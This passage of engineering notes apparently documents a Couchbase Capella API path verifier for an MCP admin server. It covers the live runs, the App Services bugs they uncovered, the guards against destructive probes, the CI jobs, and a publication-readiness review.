python3 scripts/verify_capella_paths.py --org <organization_id>              # all 61
```

Exit status is 0 only when nothing is `MISSING`, so it works in CI.

Two things it gets right that a naive version would not, both tested against a fake
Capella that reproduces the awkward cases:

- It **discovers real identifiers** (project, cluster, bucket, scope, collection, App
  Service, admin user) rather than substituting a placeholder UUID. A fabricated id makes
  every nested path return 404, which would report `MISSING` for paths that are perfectly
  correct — the most likely way for this tool to be confidently wrong.
- It distinguishes a 404 meaning *route not found* from a 404 whose body says the route
  matched and the **object** is absent. Reporting the second as `MISSING` would send
  someone to fix a path that is fine.

Anything it cannot exercise reports `SKIPPED`, never `MISSING`, so silence is never
mistaken for approval.

## Status

**569 tests** pass in both orderings (9 `live`, run separately). `ruff check` and
`ruff format --check` clean. The mutation suites still catch 45/45.

---

# v4 path verification — first live run

Run 2026-07-30 against the a Couchbase-internal test organization
(`00000000-0000-0000-0000-00000000org1`), `--only-pat`:

```
  organization : 00000000-0000-0000-0000-00000000org1
  project      : 00000000-0000-0000-0000-0000000proj1
  cluster      : 00000000-0000-0000-0000-000000clus1
  bucket       : dGVzdC1idWNrZXQ=            (base64 of a bucket name)
  scope        : _default
  collection   : _default
  app service  : NONE FOUND

  VERIFIED  [PAT] POST    capella_collection_create      405
  VERIFIED  [PAT] DELETE  capella_collection_delete      405
  SKIPPED   [PAT] DELETE  capella_app_service_turn_off        (no app_service_id)
  SKIPPED   [PAT] DELETE  capella_app_service_admin_user_delete
```

**Two of the four inferred paths are confirmed**, and they are the two that mattered
most: collection create and delete sit directly on `capella_env_ensure`'s reconcile path,
so a wrong path there would have failed part-way through standing up an environment.
Both are retagged `[LIVE]` in `spec.py` with the date and organization.

Incidentally confirmed by the discovery phase itself, since each required a successful
GET: `/projects`, `/clusters`, `/buckets`, `/buckets/{id}/scopes`,
`/scopes/{name}/collections`, and `/appservices` (which returned an empty list — the route
works, the org simply has no App Service).

## Then the method got confirmed too, by accident

I said the command below "creates a real collection". It did not:

```powershell
python scripts\verify_capella_paths.py --write-probe --only capella_collection_create
```

```
  VERIFIED  POST  capella_collection_create  422
```

**422, not 201.** The probe sends an empty body, and the operation requires `name` — so
Capella matched the route, accepted the POST, and refused the request on its contents.
Nothing was created. That is a *stronger* result than the OPTIONS probe: it proves the
path **and** the method, at no cost.

`capella_collection_create` is therefore tagged `[LIVE+METHOD]`, and this is now a mode
rather than a lucky accident:

```powershell
python scripts\verify_capella_paths.py --method-probe
```

`--method-probe` sends the real method with an empty body for every operation that
declares required body fields — 12 of the 36 write operations — and skips the rest, since
without a required field an empty body might actually succeed. If an empty body IS
accepted, that is reported as an ERROR, not a pass: it means `body_required` in `spec.py`
understates what the API demands, and something may have just been created.

## A hazard this exposed, now closed

`--write-probe --only capella_collection_create` was safe. The same line with `_delete` on
the end would have deleted the `_default` collection out of the `the test bucket` bucket — no
extra confirmation, and nothing in the output distinguishing the two cases. There is no
probe-shaped DELETE: it either happens or it does not.

A destructive `--write-probe` now requires `--yes-really-mutate` as well, and the refusal
happens **before** any API call, listing the operations it objected to. 13 of the 61
operations are destructive.

## The two still unverified

Both are App Services sub-paths and need an App Service to exist in the target project:

    DELETE .../appservices/{app_service_id}/activationState
    DELETE .../appservices/{app_service_id}/adminUsers/{admin_user_id}

The parent `/appservices` collection path is confirmed. Re-run `--only-pat` once a project
has an App Service — App Services are also what Couchbase Lite sync testing needs,
so this will resolve itself the first time that path is exercised for real.

## Worth doing next

The run above covered only the four inferred paths. The remaining 57 are `[TF]` or `[DOC]`
— good provenance, but transcription is still transcription:

```powershell
python scripts\verify_capella_paths.py
```

Exit status is 0 only if nothing is `MISSING`, so this belongs in CI against a
long-lived test organization.

---

# The full sweep found a real bug — App Services were unreachable

Running `--method-probe` across all 61 operations produced `MISSING=1 SKIPPED=45
VERIFIED=15`, and both of the interesting numbers were wrong for reasons worth recording.

## `GET .../clusters/{id}/appservices` does not exist

It returned **405**, not 200. Diffing against Couchbase's own OpenAPI document (the
embedded Redoc state at docs.couchbase.com/cloud/management-api-reference, cross-checked
against the Terraform provider's Go string literals) settles it: the cluster-scoped
`/appservices` collection defines **POST only**. The single list operation is
organization-wide:

    GET /v4/organizations/{organizationId}/appservices

with an optional `projectId` query parameter and **no** `clusterId` parameter — callers
filter on each item's `clusterId` field.

**Why this mattered and why nothing caught it.** A 405 body carries no id, so the
discovery step reported "app service: NONE FOUND" — byte-identical to what an empty list
produces. Every one of the 21 App Services operations was therefore skipped, and
`_get_app_service` in the reconciler found nothing on a cluster that had one. App Services
is what Couchbase Lite sync testing needs, so this was directly on the critical
path, and it was invisible from reading the code: the path had a `[TF]` provenance tag and
looked right.

Fixing the path forced a second fix. `_get_app_service` returned `services[0]`, which is
correct for a cluster-scoped list and **wrong** for an org-wide one — it would have
attached the reconciler to whichever App Service happened to be first in the
organization, then parked, resumed or torn down that one. It now filters on `clusterId`.

## Three more defects from the same diff

| | |
|---|---|
| `/{appServiceId}/certificate` | The API spells the segment **`/certificates`**. The operation is named in the singular; the URL is plural. Would have 404'd. |
| `accessControlFunction` keyed on `{app_endpoint_name}` | v4 keys it on a **keyspace** — `endpoint.scope.collection`. A bare name is accepted and silently read as `<name>._default._default`, so on a cluster with named scopes it targets the wrong collection. Now `{app_endpoint_keyspace}`, with the dotted form documented. |
| `MISSING` for `capella_cluster_onoff_schedule_get` | **False positive in my script.** The 404 body said the route was reached and the schedule was absent; my detector matched on prose ("does not exist") and object nouns, and the real message said "does not have an existing On/Off schedule". Now keyed on the presence of a Capella **domain error code** (`{"code":11040,...}`), which only the API's own handlers emit and only after routing. |

## No `[PAT]` paths remain

The two App Services paths still tagged `[PAT]` are confirmed by the OpenAPI document and
retagged `[DOC]`. Every path in `spec.py` now cites a primary source: `[TF]`, `[DOC]`,
`[LIVE]`, or `[LIVE+METHOD]`.

`--only-pat` consequently selects nothing, and now says so and exits **0** rather than
treating an empty selection as an error — failing a CI step for having succeeded is how a
useful check gets deleted.

## A safety bug in the verifier itself

The static-parse fallback (used whenever the MCP SDK is not installed, which is the common
case for a fresh checkout) carried six `Op` fields and omitted the two that drive the
safety decisions: `destructive` and `body_required`. Since the code read them with
`getattr(op, "destructive", False)`, the default was "not destructive" — so:

* the guard refusing a destructive `--write-probe` was **inert**, and
* `--method-probe` skipped every write operation, reporting "no required body fields"
  about operations that plainly declare them.

Both accessors now fail **closed** (unknown means destructive; unknown means not
probeable), `_StaticOp` raises rather than accepting a partial field set, and a test
compares the two sources field by field. The worst shape for a bug of this kind is a
control that works when tested one way and is silently absent in the configuration people
actually run.

## What is pinned now

`tests/test_capella.py` carries an authoritative table of 17 App Services paths read out of
the OpenAPI document, plus a guard that fails if a new App Services operation is added
without a line in it. Reading the code could not have found any of these; a table that a
test enforces can.

---

# Full sweep, clean: 36 verified, 0 missing

Re-run after the App Services fix, all 61 operations:

```
  MISSING=0   VERIFIED=36   SKIPPED=25
  VERIFIED  GET  capella_app_services_list                200   <- was 405
  VERIFIED  GET  capella_cluster_onoff_schedule_get       404 route matched;
                                                          object absent (Capella error 11040)
```

Both of the previous round's findings are confirmed fixed against the live API: the
org-wide App Services list answers 200, and the false-positive `MISSING` is now correctly
read as a routed request for an object that does not exist.

**Every path with a discoverable identifier is verified. Nothing is MISSING.** The 405s on
write operations are the OPTIONS probe working as designed — route matched, method not
OPTIONS, nothing mutated.

## The 25 skips, and which are real

Three were a gap in the script rather than an absence: `user_id` and `allowed_cidr_id` come
from lists that already answered 200, and discovery simply never read them. In the output
that is indistinguishable from an id that genuinely does not exist — it read as "cannot be
verified" when it meant "did not look". Discovery now reads both.

The remaining 22 all need one thing: **an App Service in the target project.** That
organization has none, which the org-wide list now proves rather than merely suggesting.
Creating one — which Couchbase Lite sync testing needs anyway — would let a single re-run
verify all 22, including the App Endpoint subtree.

The skip summary is now grouped by cause, with a closing line naming the missing object.
Previously each of the 22 printed the same sentence, twice over, which buried the one
actionable fact.

### Then the bootstrap found a real bug in `capella_env_create`

`--bootstrap-app-service --yes-really-mutate` creates a temporary App Service so those 22
paths can be exercised, then deletes it from a `finally`. Its first live run failed:

```
POST .../appservices  {"nodes": 1, ...}
422 {"code":422,"httpStatusCode":422,
     "message":"The instance desired capacity must be between 2 and 12."}
```

The `nodes: 1` came from `spec.py`, which stated *"2 is the documented minimum for HA; 1
suffices for testing."* That is wrong — 2 is a hard floor, not an availability
recommendation — and the same literal was hard-coded at
`handlers/capella/environment.py` in the App Service phase of `capella_env_create`.

**So the App Service phase of the primary environment tool could never have succeeded.** It
would have failed on a 422 the first time anyone ran a full `capella_env_create` against a
real organization.

Nothing caught it because nothing creates an App Service: the guardrail tests stub the client,
and the path verifier only probed with `OPTIONS`, which never sends a body. The claim was
plausible, self-consistent, documented in a description the model reads, and false.

Fixed at all three sites, now sharing one named `spec.MIN_APP_SERVICE_NODES`. Four mutation
entries cover it, including one asserting the verifier's duplicated copy of the constant
cannot drift from the spec's — the script has to run with nothing installed, so it cannot
import it.

This is the second time a live run found something invisible from reading the code. The first
was the App Services list being 405, which had made all 21 App Services operations
unreachable.

## Standing recommendation

```powershell
python scripts\verify_capella_paths.py            # all 61, read-only
python scripts\verify_capella_paths.py --method-probe   # + proves 12 write methods
```

Exit status is 0 only when nothing is `MISSING`. Worth running in CI against a long-lived
test organization that has an App Service, which would close the last 22.

---

# CI, and a release blocker it found immediately

## The release blocker

`pyproject.toml` declared `"mcp>=1.0.0"` with **no upper bound**. mcp 2.0 renamed the Tool
model's fields — `inputSchema` became `input_schema`, and the annotation hints likewise —
and this codebase reads the 1.x names in **over 400 places**. So:

```
$ pip install couchbase-admin-mcp-server && python -c "import server"
AttributeError: 'Tool' object has no attribute 'inputSchema'. Did you mean: 'input_schema'?
```

**`pip install` produced a broken server, and so would the container image** — the
Dockerfile carried the same unbounded range. 656 tests passed throughout, because the
development environment already had 1.29.0 and the suite runs against *that*. It took a CI
job that builds the wheel, installs it into an empty virtualenv, and imports from the
**installed copy** rather than the source tree.

Both are now pinned `mcp>=1.10,<2.0`, with tests that fail if either loses the bound, if
the environment the suite runs in drifts outside the declared range, or if
`Tool.inputSchema` stops existing. Supporting mcp 2.x needs a compatibility layer over the
Tool model — a separate piece of work, not a constraint change.

## `.github/workflows/ci.yml`

There was no CI at all. 656 tests and 45 mutation entries existed and had only ever been
run by hand, which makes them a snapshot rather than a guarantee.

| Job | What it does |
|---|---|
| `lint` | `ruff check` + `ruff format --check` |
| `test` | Full suite on 3.10 **and** 3.13, in **both** randomised and file order — several modules read env at import time and order-dependent tests have hidden real bugs here |
| `mutation` | Both harnesses; a surviving mutation means a control has no test behind it |
| `package` | Builds the wheel **and** the image, then imports from each — the check that found the mcp 2.0 blocker |
| `capella-paths` | Runs the v4 verifier against a live org; skips cleanly when the secret is absent, since a fork's PR cannot have it |

Node is installed in CI because the console's compile-and-render tests skip without it, and
a skipped frontend test is how the console came to render a blank page unnoticed.

## Documentation that did not survive its own instructions

The Quick start said "at minimum `CB_CONNECTION_STRING` / `CB_USERNAME` / `CB_PASSWORD`".
Following it produced `REFUSING TO START: CB_ADMIN_PROFILE is not set`. The refusal is
correct; the README simply predated it. The docker-compose example was worse — `workstation`
+ HTTP + `0.0.0.0` is fatal **twice** without two explicit acknowledgements, and it carried
neither.

Every startup control added during the review made some documented example stale, and none
of them failed a test. `tests/test_documented_configurations_start.py` now **extracts the
examples from the README** and runs them through the real validation, including a check that
each enterprise requirement is individually load-bearing.

The README also gained a **Deployment profiles** section, because the profile model was
enforced in code and explained nowhere an operator would look.

---

# Publication readiness

Checked rather than assumed. Two things were found and fixed; one remains and needs a
decision before the first push.

## Clean

- **No credentials anywhere**, in the working tree or in the git history. No `.env` file, no
  private keys, no credential-shaped strings (checked with `git log --all -p`).
- **Licensing** is coherent: stock Apache-2.0 `LICENSE`, `NOTICE` with the Couchbase
  copyright, both shipped in the wheel and the image, `pyproject.toml` agreeing, and a test
  that fails if they diverge.
- **677 tests** pass in both orderings, 9 live tests separately, `ruff check` and
  `ruff format --check` clean, **45/45 mutations caught**.
- **The wheel and the image both start**, verified by installing into an empty virtualenv
  and importing from the installed copy rather than the source tree.
- **Every documented configuration starts**, extracted from the README and the runbook and
  run through the real startup validation.

## Fixed for publication

**Live infrastructure identifiers.** The verification runs recorded a real organization,
project and cluster UUID, the organization's name, and a bucket id. These are not
credentials — they authorise nothing — but they identify real infrastructure, and a public
repository is not where they belong. Replaced with obviously-synthetic UUIDs that cannot be
mistaken for real ones, and the tree re-scanned afterwards for every removed string.

**Engagement-specific references.** Comments and test fixtures referred to the particular
deployment this was built for. The reasoning did not need it — every case was really about
the general shape: an unattended agent chain standing up ephemeral environments for
mobile-app testing. Generalised throughout, including the git history (see below), so a
single artifact serves both the original engagement and public release.

## Also worth knowing before it ships

- **22 of 61 Capella paths are unverified**, all App Services sub-paths, because the test
  organization has no App Service. Not a defect — they are `[DOC]`-sourced from Couchbase's
  own OpenAPI document. One re-run of `scripts/verify_capella_paths.py` closes them once an
  App Service exists.
- **mcp 2.x is not supported.** The dependency is pinned `<2.0` because 2.0 renamed the Tool
  model's fields and this code reads the 1.x names in 400+ places. Supporting it needs a
  compatibility layer — a real piece of work, and a likely first issue in the public repo.
- **The `capella-paths` CI job is inert** until `CB_CAPELLA_API_KEY` is set as a repository
  secret. It skips cleanly rather than failing, so a fork's PR still passes.
